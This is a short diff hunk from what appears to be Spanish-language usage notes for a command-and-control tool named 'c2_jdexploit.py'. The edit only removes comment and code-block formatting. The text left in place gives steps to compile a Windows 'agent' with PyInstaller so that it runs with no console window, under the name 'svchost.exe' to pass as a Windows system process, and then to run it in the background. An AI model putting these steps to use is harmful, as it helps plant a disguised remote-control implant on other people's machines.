@@ -7,9 +7,9 @@ python3 c2_jdexploit.py
 python c2_jdexploit.py
 
 1. En WINDOWS - Compilar y ejecutar:
-powershell
-# Compilar AGENTE en background
+
+Compilar AGENTE en background
 python -m PyInstaller --onefile --noconsole --name "svchost.exe" windows_agent_background.py
 
-# Ejecutar (se ejecutará en background automáticamente)
+Ejecutar (se ejecutará en background automáticamente)
 .\dist\svchost.exe
